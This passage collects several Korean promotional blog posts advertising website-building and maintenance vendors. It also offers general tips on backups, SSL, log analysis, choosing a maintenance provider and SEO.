있습니다. 특히 홈페이지제작 또는 홈페이지관리에 관해 잘 모르시는 분들은 필히 연락주세요    잘 이해 되도록 천천히 상담해 드리겠습니다  ▽ 홈페이지관리 전문 웹스푼 홈페이지방문  네이버 블로그는 맞지만, 확인불가안녕하세요코로나19가 지속되면서 사회적 거리 두기는 벌써 몇 달째 이어지고 자영업자의 손실은 늘어나고 있는데요​이제는 비대면 영업방식으로 자리 잡을 수밖에 없을 것 같습니다​비대면하면 온라인을 생각하게 되는데요​​​ ​​​모바일 환경은 점점 발달하고 누구나 편한 쇼핑이 이루어지니 이제는 사업하는 분들 온라인 환경을 외면할 수 없게 되었습니다​온라인쇼핑하면 먼저 홈페이지를 생각하게 되는데요​요즘의 홈페이지는 단순히 물건을 파는 공간을 넘어서 고객과 소통하는 공간이 되어가고 있습니다​​​ ​​​고객의 구매 성향을 파악하기도 하고 고객의 기념일에 맞추어 카드를 보내 자사의 홈페이지 방문을 유도하기도 하는데요​때문에 강력한 마케팅 수단이 될 수 있는 사업장의 홈페이지는 그 퀄리티뿐 아니라 기능면에서도 꼭 필요한 것들로 채워진 홈페이지 제작은 꼭 필요한 과정이 됩니다​​​ ​​​그러려면 그 정도의 제작 스킬을 가진 능력 있는 업체를 선택해 홈페이지를 제작 의뢰해야 하는데요​홈페이지 제작의 기능과 퀄리티를 갖추려면 전문가의 실력이 필요하기 때문입니다​또한 그 제작비용과 사후 AS 문제도 심각한 고려가 필요한데요​홈페이지만 제작해 놓고 실력이 안되어 사용 못 하는 자영업자분들도 많이 있기 때문입니다​​​​ ​​​​이런 모든 것을 고려한 홈페이지 제작업체 선택은 바른웹이 될 수 있는데요​바른웹은 7년간 10,000여 개 이상의 홈페이지를 제작해오며 '기업부설연구소'에서 인증받은 전문 홈페이지 제작 업체로 이미 수많은 이용자가 있는 기업입니다​​​ ​​바른웹은 사업자의 홈페이지를 무료로 제작해 주고 월 3만 원의 가격으로 관리까지 받을 수 있는 전문 홈페이지 제작 업체인데요​모바일의 경우 32페이지의 분량의 홈페이지를 무료로 제작하여 드리고 5년 동안 월 3만 원의 가격으로 이용할 수 있습니다​​​ ​​​​사업자가 홈페이지를 운영하는 동안 생길 수 있는 모든 문제를 바른웹 담당자의 도움으로 5년 동안 해결 받을 수 있다는 말인데요​그 후에는 무료로 사업자에게 홈페이지가 귀속되어 사업하는 동안 지속적으로 홈페이지를 이용할 수 있습니다​​​ ​​​결론적으로 월 3만 원으로 무료 홈페이지를 갖게 되고 홈페이지를 운영할 실력을 얻게 되는 일석이조의 효과를 바른 웹을 이용하면서 얻을 수 있는데요​PC/모바일/반응형 홈페이지 등 모든 유형의 홈페이지를 무료로 제작해드립니다​​ ​​​때문에 오랜 기간 사업을 하시는 분들께 비용 절감의 기회가 될 수 있으며, 사업을 새로 시작하는 사람들 또한 언제든지 수정 및 관리가 가능한 홈페이지를 합리적인 가격으로 이용할 수 있게되는 데요​비대면 영업을 고려한다면 아래의 링크를 이용해 상담해보세요​​​ ​​ ​제작비용은 무료5년간의 유지 보수 비용으로 양질의 고퀄리티 홈페이지를 운영할 수 있습니다​​홈페이지 제작 및 관리 무료상담하러가기​​  ​ ​​#무료홈페이지제작, #홈페이지제작업체, #웹사이트제작, #홈페이지제작비용, #모바일사이트제작 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가안녕하세요 홈페이지관리 전문 웹스푼 담당자입니다.  이번에는 장사하시거나 사업하시는 분들에게 유용한  유용한 홈페이지관리 정보를 알려 드리고자 합니다.  제가 전화 상담을 받아보면 가장 많이 받는 질문은 홈페이지관리 하던 사람이 관리를 엉성하게 해서 홈페이지가 제 기능을 못한다 라는 말입니다. 우선 홈페이지 관리업무를 보는 사람들은 대체적으로 웹마스터라는 직함을 가지고 있습니다. 프로그램 지식도 어느정도 있어야 하고 디자인 툴도 어느정도 다뤄야 하는 직종이죠. 그러나 현실은 이들이 너무 아마추어적이라는 점입니다. 그러니 의뢰인과의 마찰이 생기게 되는 거죠. ■ 제대로 된 홈페이지관리는 웹스푼에서 ↓ http://findblog.co.kr홈페이지관리를 의뢰하는 사람들은 관리자가 디자인도 어느정도 잘하고 원하는 시간에 작업물을 제공해주는 그런 사람을 원합니다. 또한 온라인마케팅을 담당자에게 좀 배워보고 싶어 하기도 합니다. 하지만 현실은 그런 사람에게 맡기고 싶어도 맡기기가 쉽진 않다는 점입니다. 이유는 모두 다 잘하는 사람들은 드물다는 데 있죠. 또한 나이가 좀 어리거나 경력이 짧은 사람에게 맡기면 대체적으로 트러블이 발생합니다. 이유는 바로 책임감 때문이죠. 관리자는 가능한한 의뢰자의 의중을 잘 살펴봐야 합니다. 의뢰자가 원하는 결과물을 내기 위해 서로간의 커뮤니케이션을 활성화 해야 합니다. 그런 작업과정을 거쳐 작업물이 나와야 하는데 아무나 할 수 있는 일은 아니죠.  결국 홈페이지관리는 어느정도 연륜이 있고 경험이 많은 사람에게 맡기셔야 합니다. 책임감과 신뢰감 그리고 소통문제 때문이죠. 홈페이지관리 참 중요합니다. 어떻게 보면 제작보다 더욱 중요한 항목입니다.  홈페이지관리를 제대로 하는 경쟁업체는 나보다 앞서가고 있습니다. 지금부터 더욱 신경 써야 할 부분이라 생각 됩니다.홈페이지를 새로 만드시거나 아니면 기존의 것을 세련되게 리뉴얼 또는 관리 하시려는 분들은 바로 웹스푼 홈페이지제작을 추천 드립니다. 저희 웹스푼은 신뢰를 가장 중요하게 생각하고 있습니다. 특히 홈페이지제작 또는 홈페이지관리에 관해 잘 모르시는 분들은 필히 연락주세요  잘 이해 되도록 천천히 상담해 드리겠습니다.  (계약은 안하셔도 됩니다 ^^..모르시는 것,어려운 것 있으면 언제든지 연락주세요~) ▽ 홈페이지관리전문 웹스푼 홈페이지방문  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가꽃배달홈페이지 관리     기념일, 결혼식, 개업식 등에 화환, 꽃바구니가 필요하여 꽃배달홈페이지에서 주문하는 분들이 많아요. 그리고 다른 지역에 배송 주문이 들어오는 경우가 있는데요. 이런 경우 꽃배달홈페이지 관리에서 주문발주 기능으로간편하게 협회에 발주 요청하여 배송할 수 있어요. ​​​  꽃배달홈페이지 관리에서 발주하는 방법  1. 주문 목록에서 발주 클릭    2. 배송지역의 협회를 선택하고 수주회원 검색하기(※ 쇼핑몰 관리 페이지에서 발주설정에서 관리 할 수 있음)​3. 옵션상품이 있는 경우 해당 상품 클릭 4. 최종 확인 후 발주하기 클릭​​​  5. 발주가 완료된 후 배송 상환이 자동으로 변경되고 배송이 완료된 후 고객에게 문자발송 됨     꽃배달홈페이지 관리 발주 기능으로 다른 지역에도 빠른 배송이 가능한데요.꽃집에 필요한 시스템이 있는 곳 뉴런시스템 로즈메이커에서는 다양한 기능으로 꽃배달홈페이지를 간편하게 관리할 수 있으니 꽃집홈페이지제작에 대한 문의나 관리 기능에 대해 궁금한 것이 있다면 상담받아 보세요. ​​​​​​  ​홈페이지유지보수 (홈페이지유지관리) 관련 업체들도 은근히 많기 때문에 이 중에서 어떤 업체를 고르느냐는 중요한 이슈 중의 하나입니다.​간단히 홈페이지유지보수 (홈페이지유지관리) 업체 고르는 요령에 대해 정리해 드리겠습니다.​​  © nastya_gepp, 출처 Pixabay ​홈페이지유지보수 (홈페이지유지관리)가 가능한 곳인지를 먼저 물어보자!홈페이지유지보수 업체마다 기술적인 특징이 있습니다.디자인에 강점이 있기도 하고, 기술에 강점이 있기도 하고, 특정 기술언어에 강점이 있기도 합니다. 대부분은 다 비슷한데, 중요한 것은 내 홈페이지에 사용된 기술을 가지고 홈페이지유지보수 업체에서 유지보수가 가능한 지를 먼저 따져봐야 됩니다.​​  © Pexels, 출처 Pixabay ​php로 만들어져 있고, 일반 독립형 제작으로 되어 있다면 대부분 업체에서 가능합니다.하지만 asp나 jsp로 되어 있고, 특히 빌더형으로 되어 있따면 다른 업체로의 유지보수가 대단히 어렵습니다.워드프레스 주문형으로 만들어져 있어도 다른 업체에서 유지관리를 맡으려고 하지 않습니다..먼저 내 홈페이지를 보여주면서 유지관리가 가능한 지를 살펴봐야 됩니다.​​  © kellysikkema, 출처 Unsplash ​홈페이지유지보수 (홈페이지유지관리) 작업프로세스가 안정적인 곳인지 살펴보자.어떤 곳은 홈페이지유지보수 관련된 작업 프로세스가 미숙한 경우가 많습니다. 특히 신생업체나, 개인프리랜서인 경우 작업프로세스가 여러 경우의 수로 잘 분류되지 못한 경우가 많습니다. 홈페이지유지보수 작업 프로세스가 안정적인 곳을 찾으세요.작업프로세스가 안정적인 곳은 가장 중요한 언제까지 완성하겠다! 라는 고객과의 약속이 있으면 왠만한 일이 있어도 이를 99프로 이상 완수하게 됩니다. 내부적으로 그렇게 시스템화되어 있기 때문입니다.홈페이지 수정과 유지보수에 있어서 제 때 제대로 완성해주느냐 계속 지연되느냐는 아주 중요한 요소입니다.​​  © geralt, 출처 Pixabay ​홈페이지유지보수 컨설팅이 가능한 곳을 찾자!유지보수 경험이 많고 업체 경력이 오래된 경우 홈페이지 기술의 변천사를 알고 있기 때문에 유지보수 서비스를 받으며 내 홈페이지의 바람직한 개선방향을 제안받을 수도 있습니다.단순히 디자인적인 방향 뿐만 아니라, 기능적인 부분에서 지금 사용된 기술이 이미 사장된 기술이라든지, 아니면 다른 업체로 이관 관리가 안되는 기술이라든지, 모바일쪽에서 어떤 문제가 우려된다든지 등.. 고객 입장에서는 예상하지 못할 여러가지 경우의 수를 미리 알려줄 수 있습니다.​  © helloolly, 출처 Pixabay 어떤 경우에는 홈페이지유지보수를 맡기려다가 아예 홈페이지 리뉴얼을 하는 경우도 있고, 이게 더 나은 경우도 많습니다. 특히 모바일을 고려하면 제작 5년이상된 홈페이지는 리뉴얼을 하는 게 바람직합니다.이러한 종합적인 판단을 할 수 있는 홈페이지유지보수 업체를 찾으세요.​​​  © lakexyde, 출처 Pixabay ​​다양한 계약조건의 홈페이지유지보수 (홈페이지유지관리) 조건이 있는 곳을 고르자!어떤 곳은 연단위 유지보수만 가능하고, 어떤 곳은 건바이 건 유지보수만 가능하기도 합니다.내 홈페이지에 맞는 계약조건을 제시하는 곳을 고르세요.안정적인 유지관리를 원한다면 연 단위 계약으로 다양한 옵션이 있는 곳이 좋고건바이건 발생시에만 유지관리를 원한다면 건바이건 1회성 수정을 받는 것도 좋습니다.​​​  © rawpixel, 출처 Pixabay ​​위와 같은 여러가지 요건들을 종합적으로 고려해서 홈페이지유지보수 업체를 고르시기 바랍니다.잘 고른 업체 하나가 앞으로 중요한 인터넷 사업의 훌륭한 파트너사가 될 수도 있습니다. ^^이상 10년 이상의 홈페이지제작/수정/유지보수 전문 경험의www.홈페이지제작.kr 이였습니다!​ 웹사이트제작, 홈페이지제작 전문 아이코리아비즈홈페이지제작, 홈페이지제작비용, 홈페이지제작가격, 홈페이지제작업체, 병원홈페이지제작, 개인홈페이지제작, 펜션홈페이지제작업체, 사이트제작 전문www.홈페이지제작.kr 전국 언제 어디서나유선 바로 상담도 가능합니다.1661-5668아이코리아비즈서울특별시 서초구 양재천로23길 23 홍우빌딩 402호  ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 몰래 알려주는 홈페이지제작및관리  반드시 기억하세요! 홈페이지 백업에 대해  스마트 폰, 스마트 기기, 스마트 워치 등  하루에도 ‘스마트’라는 단어를 계속해서 말하게 되는 것 같아요. 현대사회는 날이 갈수록 똑똑해져야 살기 편한 세상이 되어 가는 것 같습니다.     그럼 오늘은~ 스마트하게 홈페이지제작및관리에 관한 꿀팁을 드려볼까요?    이번에는 홈페이지 백업에 대해 알아볼까 합니다.먼저 홈페이지 제작 완료 후 부족한 부분을 보완하다 보면 수정한 부분이 마음에 들지 않아 처음 상태로 되돌아가고 싶은 경우가 있기 때문에 꼭 백업을 해두는 것이 바람직합니다.    또 관리 중 컨텐츠나 페이지를 잘못으로 지웠을 시를 대비해 백업 작업은 필수입니다.홈페이지를 미리 백업해 두었다면 자유로이 원상복원이 가능합니다.그리고 홈페이지가 해킹되어 문젯거리가 생겨났을 경우에는 백업 파일을 불러와 복원이 가능합니다.따라서 웹사이트를 관리 하신다면 백업은 꼭 꾸준하게 진행되어야 합니다.   만약 홈페이지 제작을 전문업체에 맡겼을 경우 백업 계약도 약정해 놓으시면 좋은데요.계약 내용 상에 지속적인 기간마다 백업 문서파일을 제공받기로 명시해 둔다면 파일과 소스를 안전하게 보장받을 수 있기 때문입니다.  어느 정도 업체 스케일이 있는 웹호스팅 업체들은 자체 백업 프로세스가 있으므로 업체 선발 시 참고하시기 바랍니다.    홈페이지 부가서비스, 철저하게 알아봅시다!    기본적인 솔루션형 홈페이지의 경우, 저렴한 비용으로 제작할 수 있지만디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 알맞은 홈페이지 관리가 필요하거나지속적인 관리운영이 필요한 홈페이지의 경우, 맞춤형 서비스를 사용하여 보는 것이 좋습니다.여기서 대표적인 몇가지 부가서비스들에 대해 알려드리겠습니다.먼저 로그분석은 홈페이지의 실적을 측정할 시에 필요한 방문자 정보, 트래픽, 사이트 이동 경로 등의 데이터를 확인할 수 있는 분석 도구로 이를 적용하여 사이트 보안이나 이벤트, 유입 전략 등을 설립할 수 있습니다.부정클릭이란 광고비를 급속도로 소진시키려는 악의적인 계획을 가지고 마구잡이로 클릭하는 것을 의미하는데, 홈페이지 관리비가 많이 들어가므로 로그분석을 통해 확인하는 것이 좋습니다.   그리고 보안서버란 개인 정보의 유출과 해커가 중간에서 데이터를 가로채는 것을 막고자,인터넷 사용자의 개인 자료를 암호화, 복호화하여 전송하는 서버를 말합니다.현재 법적으로 이용자의 개인 정보 보호를 위해, 개인정보를 관리하는 모든 사이트는 개인 정보 전송구간에 무조건적으로 보안서버(SSL)를 설치해야 합니다.  홈쇼핑을 운영할 때는 전자 결제서비스의 결제시스템을 이용하여 카드결제나 실시간 계좌이체 등을 바로 확인 할 수 있습니다. 또한, 매출의 집계나 결제 기록을 관리할 수 있으므로 편리합니다.    누구보다 성공적인 쇼핑몰 제작을 원한다면? 원데이넷 서비스를 이용하세요!    원데이넷은 손쉽게 쇼핑몰을 만들 수 있는 독립형 솔루션 하이센스 2.0을 제안합니다.하이센스 2.0은 급변하는 웹 트렌드에 맞춰 제작된 솔루션이에요.코딩 시스템이 쉬워 작업자가 관리하기 편하며,모바일 기기에 따라 달라지는 남다른 화면으로 고객 편의성도 높습니다!원데이넷 하이센스 2.0으로 모든 사용자와 관리자에게 최적의 모바일 샵을 제작하세요!구매 시 평생 라이선스가 보장되는 합리적인 서비스!고객님을 위해 부담 없이 저렴한 가격으로 소개해 드립니다.    오늘 홈페이지제작및관리 정보는 어떠셨나요? 영양제도 꾸준히 먹어야지 효과가 있는 것처럼홈페이지제작및관리에 관련된 것도 꼬박꼬박 읽게 되면 어느샌가 전문가가 돼있을 거예요!앞으로도 자주 와 주실 거죠? 언제나 알찬 소식들로 찾아오겠습니다~  홈페이지제작및관리 지식 창고!나만 몰랐던 홈페이지 백업에 대한 꿀팁! 제가 늘 새로운 소식과 함께 이웃님들을 찾아오는 이유는?늘 같은 것만 하고 살면 재미없잖아요~ ^^여러분의 생활 속 활력소가 될 홈페이지제작및관리 대한 이야기, 지금 시작하겠습니다! 홈페이지 관리 시 파일 업로드 프로그램인 FTP를 사용하여 프로그램 창 왼쪽에 있는 폴더의특정 파일들을 더블클릭함으로써 홈페이지 내 서버에 직접 업로드할 수 있습니다.이렇게 홈페이지 관리를 하다가 컨텐츠나 페이지를 실수로 지웠을 때를 대비해 백업 작업은필수이며 홈페이지를 명확하게 백업해 놓았다면 언제라도 복구가 가능하답니다.특히 홈페이지 제작 완료 후 부족한 부분을 바꿔나가다보면 수정한 부분이 마음에 들지 않아처음 상태로 되돌아가고 싶은 경우가 많기 때문에 반드시 백업을 해두는 것이 좋아요.또한 홈페이지가 해킹되어 문젯거리가 나타났을 경우 백업 파일을 불러와 원상복구가 가능하며,따라서 사이트를 관리하신다면 백업은 반드시 정기적으로 진행되어야 합니다. 일반적으로 어느 정도 업체 규모가 있는 웹호스팅 기업은 자체 백업 프로세스가있으니 업체 결정 시 참고하시어 결정하시기 바랍니다.홈페이지 제작 및 관리 시 주의사항에 관한 정보 파헤치기홈페이지를 제작할 경우는 계약금과 웹페이지의 퀄리티를 비교해봐야 하는데요.비용에 비하여 과도하게 허술한 경우에는 금액 조절을 하거나 퀄리티를 올려달라고 요청해야 합니다.그리고 홈페이지를 만들 때 원하는 디자인 샘플등을 첨부하여 명확히 알려주는 것이 좋은데,그래야 제작자와 의뢰인간의 커뮤니케이션이 정확하게 이루어지기 때문에 결과물 만족도가 높아요.홈페이지 제작이 끝나면 관리를 위한 서비스를 인수받아야 하며,관리아이디와 비밀번호, 매뉴얼 등을 받고 간단한 사용법을 익혀야 꾸준히 관리할 수 있답니다.특히 홈페이지를 인수받을 때 무조건 지우거나 건들지 말아햐 하는 파일을 알아 놓아야,중요 파일들을 지우거나 옮겨서 홈페이지가 이상하게 보이거나 않는 일을 막을 수 있어요. 또한 홈페이지 제작 후엔 업체나 제작자와 하자보수기간을 가능한 상의해서 정해야 하는데, 홈페이지는완성 후 각종 에러들이 발생할 가능성이 매우 높아 적어도 한 달 정도 보수해야 하니 참고하세요.고급스러운 홈페이지 제작으로 가성비 최고의 효과를 보기 원하는 분에게18년의 오랜 업력을 갖춘 드림인터페이스를 소개합니다. 드림인터페이스는 홈페이지/모바일 홈페이지/쇼핑몰 고급 맞춤형 전문 제작회사에요.풍부한 실무 경험을 가진 개발진과 디자이너가수준 높은 퀄리티로 제작하며, 여러 요구사항까지 적극 반영해 드립니다! 업체 홈페이지 제작 또는 홈페이지 개편이 요구되는 시점이라면거품 없는 견적을 약속하는 드림인터페이스에 문의해보세요!도교는 배운 것을 돌려주고 경험을 나누라고 했어요.배운 것을 나누는 것 만큼 좋은 일은 없다고 생각해요. 또 나누면그 기쁨은 몇배가 되니 말이죠. 오늘 홈페이지제작및관리에 대한 정보도혼자만 생각하지 있지 말고 주변 사람들과 공유하길 바랍니다.    한번에 알아보는 홈페이지제작및관리 홈페이지 부가서비스, A부터 Z까지 알아볼까요?    음식을 맵게 먹으면 평소에 먹는 양보다 조금 먹는다고 합니다~ 캡사이신이 위를 자극해서 실제 섭취한 음식보다 더 빨리 포만감을 주기 때문이라는데요.    그런데 저는 매운 음식을 좋아해서 오히려 더 많이 먹을 것 같은걸요 ㅠ 저렇게 요령을 부리면 언제든 지킬 수 있다는 것!홈페이지제작및관리  포스팅만은 요령 없는 전직한 정보로 전해드리도록 하겠습니다.    홈페이지 방문자의 행태와 경로, 클릭한 페이지 등을 확인하는 툴 중, 로그분석 프로그램이 있어요.    또한 기본적인 솔루션형 홈페이지의 경우, 저렴한 금액으로 제작할 수 있는데요.허나 디자인이나 팝업창, 텍스트 수정이 어려울 수 있습니다.따라서 업체와 사이트의 특성에 맞게 맞춤 홈페이지 관리가 필요하거나 지속적인 관리운영이 필요한 홈페이지의 경우, 맞춤형 서비스를 사용하여 보는 것이 좋죠.        그리고 부정클릭이란 광고비를 갑작스럽게 소진시키려는 악의적인 생각을 가지고 마구잡이로 클릭하는 것인데요. 홈페이지 관리비가 많이 들기 때문에 로그분석을 통해 확인하시는 것이 좋습니다.     뿐만 아니라 로그분석에 사용되는 액세스로그는 업체 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 목록이에요. 액세스로그의 자료를 분석하여 홈페이지에 접속한 고객님들의 흥미를 파악할 수도 있죠.        참고로 전자 결제서비스의 경우, 결제시스템을 이용해 카드결제나 실시간 계좌이체 등을 빠짐없이 확인 할 수 있습니다.또한, 매출의 집계나 결제 내용을 관리할 수 있기때문에 편리하죠.     모바일 홈페이지 제작에 관해 찾아볼까요?    모바일에 최적화된 모바일 홈페이지는, 추가로 모바일 버전 사이트를 만드는 것과  PC버전의 홈페이지가 스마트폰 화면으로 호환되는 두 가지 옵션이 있습니다.        또한 모바일 페이지 제작 시에는 초기 계약 비용도 중요한데요.계획없이 저렴한 곳만 찾아서 할 경우에는 이후 추가 비용이 2배로 발생하거나 느린 피드백으로 마음고생이 심할 수 있어요.     뿐만 아니라 모바일 사이트를 만들 때 반응형 웹 형태로 만드는 것이 중요합니다.반응형 웹으로 구성된 페이지는 각종 태블릿 및 다양한 모바일의 해상도에 알맞은 비율로 제공 가능하므로 가독성이 높다는 장점이 있죠.그리고 모바일 홈페이지 제작의 중요성이 증가하면서 많은 분들이 대행업체를 활용해 제작을 진행하고 있는데요.계약 전 오타에 대한 부분은 가급적 대행업체의 책임으로 하여야이후 오타 수정으로 인한 추가 비용이 더해지는 것을 막을 수 있습니다.        참고로 모바일 사이트 제작 업체 채택 시에는 확인서 사항의 유지 보수 비용 조건 및 사용권 인정에 대해 꼼꼼히 체크하셔야 합니다.     행복해서 웃는 것이 아니라 웃어서 행복하다는 말 들어보셨죠?참 멋진 말이 아닌가 싶어요. 오늘도 즐겁게 웃고 떠들며 행복을 느껴보세요.    다음번에는 더 유용한 정보로 여러분께 웃음을 드리도록 하겠습니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 안녕하세요!오늘 엄청 더웠는데 다들 어떻게 보내셨나요?이젠 5월 끝자락 초여름의 날씨가 찾아왔나봅니다!​최근 지인의 창업소식을 듣고도움이 되기 위해 이것저것 알아보던 중#홈페이지만들기 조언을 듣다가#무료홈페이지제작 플랫폼을 알게되었어요!​​ ​​ 홈페이지만들기무료홈페이지제작하고 괸리받으세요​사실 정말 많은 #홈페이지제작업체 상담을 받아보며헉! 하는 #홈페이지제작비용 좌절모드그렇다보니 걱정 가득안고 창업을 시작한 지인은초기 드는 비용이 예산보다 많아많이 속상해하더라구요​그러던 중 알게 된 무료홈페이지제작 바른웹이 곳은 전문 디자이너들이 직접 디자인하는홈페이지제작 플랫폼 이더라구요!​​>>무료홈페이지제작 상담신청<<​​ ​​이곳은 #웹사이트제작 등 처음부터 제작에 드는 비용은무료제작 진행이 되며전문가가 계속 관리를 해주는 관리형 홈페이지제작이예요!월 3만원의 관리비용으로 내 홈페이지를내 리즈에 맞게 전문 디자이너가 제작해주고관리까지 해주니 창업을 시작하는 초보사장님에게는최고의 맞춤형 서비스가 아닐까 생각이 들더라구요!​​ ​​임대형식의 홈페이지가 아닌내 개인소유의 홈페이지를 제작해주고5년 이후엔 비용 발생이 전혀 되지 않아요!다방면으로 생각해 봐도 비용절감은 확실하더라구요!​5년이라는 시간이 길게 느껴지시나요?수많은 고민 끝에 시작한 일인데쭉쭉 승승장구 해야죠!그렇게 되기 위해선 내 사업에 눈에 확 띄는 옷을 입혀줘야 하지 않을까요?​그 옷이 바로 홈페이지제작이랍니다!​​ ​​다년간 수많은 기업과 회사의 홈페이지를만들어 온 실력이 입증 된 회사 바른웹!무료라고 다 같은 서비스?그럴리가 없지요!무료제작을 전문디자이너가 제작해주며관리비까지 지불하고 관리받는 내 홈페이지인데!​잘 만든 홈페이지 하나가 어떤 변화를 주는지는사업을 하는 분이라면 모두 알고있는 사실이랍니다!​​ ​​한눈에 사로잡는 홈페이지는 곧 수익이라는 사실!현재 코로나로 인해 홈페이지를 가지고 있는 사업장과아닌 사업장은 매출에도 큰 영향을 미치고 있답니다!사람도 첫 이미지가 굉장히 중요하듯사업장도 찾는 고객들이 홈페이지를 통해사업장을 처음 접할 때 인상을 놓쳐서는 안되잖아요!​​ ​​이젠 바른웹 통한 고객들의 반응을하루라도 빨리 느껴보세요!모든 정보는 곧 돈!좋은 정보 알게 되었을 때바로 실행에 옮기는 분들은 좀 더 빠르게성장하고 있습니다!​​👇클릭시 상담신청페이지로 이동👇 바른웹 - 비디오 서비스 플랫폼 자몽pick바른웹 무료로 고퀄리티의 홈페이지를 제작해주는 바른웹 에이전시 서비스를 추천합니다. - jamongpickjamongpick.com ​홈페이지제작을 고민하는 분모두 바른웹 통해 자신에게 꼭 맞는 옷 입혀주세요~!​​ ​ ​​안녕하세요? 위시켓입니다.웹사이트를 관리할 때는, 방문객들이 원하는 경험을 제공할 수 있도록 사이트가 만반의 준비를 끝냈는지 확인하는 것이 중요합니다. 2020년에는 사람들이 집에서 일을 하고 인터넷을 서핑하는 데 보내는 시간이 대체적으로 많아졌기 때문에, 웹사이트를 효율적으로 관리하는 데 있어서 보다 세심한 주의가 필요한데요. 홈페이지 관리 방법에 대해 알아볼 때, 우리가 가장 우선적인 목표해야 하는 것은 브랜딩입니다. 브랜드는 제품이나 서비스를 마케팅하는데 있어서 중요하기 때문입니다. 강력하면서도 한결같은 브랜드를 만들면, 사이트의 방문자 수를 늘리고 고객의 충성도도 훨씬 더 쉽게 높일 수 있습니다.​소규모로 시작해서 웹사이트 관리 능력을 키우고 싶다면, 먼저 소셜 미디어 마케팅에 집중하기 위해 검색엔진최적화(SEO)를 배우는 것으로 시작할 수 있는데요. 이렇게 배운 스킬들은 향후에 여러분의 웹사이트와 브랜드에서 충분한 성과를 얻을 수 있습니다. 이번 글에서는 위시켓은 기본이지만 그만큼 가장 중요한 웹사이트 관리 방법에 관한 가이드를 알려드리고자 합니다. 여러분의 온라인 비즈니스를 성장시키는데 큰 도움이 되었으면 좋겠습니다.​*잠깐, 위시켓은 2019년 시밀러 웹 방문자 수 기준, 국내 1위 IT아웃소싱 플랫폼입니다. 현재 8만 이상의 개발업체, 개발 프리랜서들이 활동하고 있으며, 무료로 프로젝트 등록이 가능합니다. 프로젝트 등록 한 번으로 여러 개발업체의 견적, 예상 기간, 포트폴리오 등을 한 번에 비교해보세요:) ​ 가장 기본이 되는홈페이지 관리 방법5가지.01. SEO 기법들을 잘 알아둔다 ​검색엔진최적화는 구글이나 빙(Bing)과 같은 검색엔진에서 여러분의 웹사이트가 잘 보일 수 있게 하는 다양한 방법들을 말합니다. 대표적으로 구글에서는 어떤 웹사이트가 가장 최적화된 곳인지를 판단하기 위해서 랭킹 알고리즘을 사용하고 있습니다. 이런 종류의 최적화에는 텍스트 콘텐츠에서 적절한 키워드를 사용하는 것에서부터 웹사이트의 속도와 성능을 향상시키는 것까지 다양한 방식들이 존재합니다.​검색엔진최적화의 핵심적인 요소는 웹사이트 내의 여러 페이지들이 가진 전체적인 중요성을 측정하기 위해 만들어진 페이지 랭킹입니다. 구글의 페이지랭크(PageRank)에서는, 반응형의 기능을 갖춘 웹사이트들이 아직 모바일 기기에 최적화되지 않은 페이지들보다 더 높은 랭킹(순위)을 얻습니다. 반응형 기술이라는 것은 어떠한 기기를 이용하더라도 아무 문제 없이 여러분의 웹사이트에 접속할 수 있다는 것을 의미합니다. 만약 이런 기술을 구현하지 않았다면, 모바일 사용자들은 화면에 맞지 않는 페이지들을 보게 될 것이며, 여러 차례 스크롤을 해야만 합니다. 대부분의 모바일 사용자들은 반응형이 아닌 웹사이트는 기피하는 경향이 있습니다.​ ​워드프레스(WordPress) 웹사이트에서 좋은 성능을 발휘하는 플러그인을 다운로드해서 설치하는 것은 물론이고, 구글 AMP를 활용해서 사이트의 속도와 성능을 높이는 것이 좋습니다. 구글의 AMP는 기본적으로 웹사이트 내에 있는 핵심적인 CSS, HTML, 자바스크립트(JavaScript) 구성요소들을 압축하고 최적화해주기 때문에, 멀티미디어나 용량이 큰 다른 요소들로 인해 홈페이지 노출 순위가 뒤로 밀리는 것을 막아줍니다. 웹사이트의 텍스트 콘텐츠 안에 적절한 키워드를 연결하는 것도 검색 결과를 순위를 높이는 데 도움을 주는데요. 올바른 키워드를 사용했다면, 이번에는 웹사이트를 잘 보이게 하고 트래픽의 유입량을 늘려야 합니다.​SEO를 강화하기 위해 사용할 수 있는 간단한 요령들은 많이 있습니다. 예를 들어서, 웹사이트 내에 있는 각각의 페이지에 구체적이면서도 정확한 제목을 사용하면, 구글의 SEO 알고리즘이 더 최적화된 사이트라고 판단하게 됩니다. 사람들이 웹사이트에 직접 들어가 보지 않아도 사이트의 내용이 무엇인지를 알 수 있게 설명해 주는 메타데이터(metadata)도 마찬가지입니다. 이러한 메타데이터를 포함시켜 놓으면 구글의 랭킹 알고리즘에게 좋은 신호를 보내는 것이며, 온 페이지(on-page) SEO도 개선될 것입니다.​키워드는 사이트의 콘텐츠 안에 들어갈 수 있는 단어나 문구이며, 검색엔진이 여러분의 웹사이트를 검색할 수 있도록 허용하는 것이기도 합니다. 웹사이트와 연관되는 블로그 게시글 안에 적절한 키워드가 들어 있고 트래픽이 증가하고 있는 것이 발견된다면, 구글은 검색 결과에서 해당하는 웹사이트 페이지들의 순위를 높게 보여줄 것입니다. 인터넷 사용자의 대다수가 검색어를 입력해서 얻은 결과들 중에서 맨 처음에 보이는 3개 중 하나만을 선택한다는 것을 명심해야 합니다. 그렇기 때문에 보다 많은 사용자들을 끌어모으기 위해서 순위를 높이는 것이 중요한 것입니다. 여러분의 SEO 관리 방식을 개선하고자 할 때는, 신규 콘텐츠를 주기적으로 추가하고, 기존의 콘텐츠는 업데이트해야 합니다. 블로그 게시글도 사이트의 트래픽을 높일 수 있는 또 하나의 효과적인 방법입니다.​​ 02. 소셜 미디어의 존재감 키우기 2020년에 홈페이지를 관리하는 데 있어서 또 하나의 핵심적인 요소는 소셜 미디어의 존재감을 키우는 것입니다. 페이스북 하나만 하더라도 매달 26억 명 이상의 